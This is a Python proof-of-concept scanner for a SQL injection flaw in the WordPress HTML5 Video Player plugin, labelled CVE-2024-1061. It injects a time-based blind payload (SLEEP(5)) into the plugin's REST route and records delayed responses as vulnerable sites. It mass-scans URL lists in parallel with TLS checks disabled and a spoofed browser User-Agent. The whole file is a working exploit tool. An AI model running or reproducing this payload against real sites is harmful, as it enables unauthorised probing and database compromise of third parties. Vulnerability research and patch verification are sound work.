# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
import json
from multiprocessing.dummy import Pool
import requests
import urllib3
import time
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = r"""
____________________________________________________________________________
                                                                            
                   _..-'(                       )`-.._                      
                 ./'. '||\\.       (\_/)       .//||` .`\.                  
              ./'.|'.'||||\\|..    )O O(    ..|//||||`.`|.`\.               
           ./'..|'.|| |||||\`````` '`"'` ''''''/||||| ||.`|..`\.            
         ./'.||'.|||| ||||||||||||.     .|||||||||||| |||||.`||.`\.         
        /'|||'.|||||| ||||||||||||{     }|||||||||||| ||||||.`|||`\         
       '.|||'.||||||| ||||||||||||{     }|||||||||||| |||||||.`|||.`        
      '.||| ||||||||| |/'   ``\||``     ''||/''   `\| ||||||||| |||.`       
      |/' \./'     `\./         \!|\   /|!/         \./'     `\./ `\|       
      V    V         V          }' `\ /' `{          V         V    V       
      `    `         `               V               '         '    '       
____________________________________________________________________________

tag: this is a WordPress Plugin HTML5 Video Player SQL注入漏洞(CVE-2024-1061)
                    @version: 1.0.0   魔改修复版（请叫我雷锋）          
    """
    # print(test)
    print("\033[36m{}\033[0m".format(test))


def poc(target):
    if target[-1] == '/':
        target = target[:-1]
    else:
        target = target
    path = "/?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+"
    url = target + path
    headers = {
        "Connection":"close",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip",
    }




    try:
        # conn = http.client.HTTPConnection(target)
        # conn.request("POST", path, body.encode("utf-8"), headers)
        # response1 = conn.getresponse()
        start_time = time.time()    # 请求开始时的时间戳
        response1 = requests.get(url, headers=headers, stream=True, verify=False, timeout=15)
        # print(response1.status_code)
        end_time = time.time()  # 请求结束时的时间戳

        response_time = end_time - start_time
        # print(response_time)
        if response_time > 4 and response_time < 15:

            print("\033[31m[+] {} 💖💖💖💖💖 存在sql注入！\033[0m".format(target))

            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")

        else:
            pass

    except Exception as e:
        # print(f"[*] {target} error: {str(e)}")
        pass

def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='任何问题找星主！！！！')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
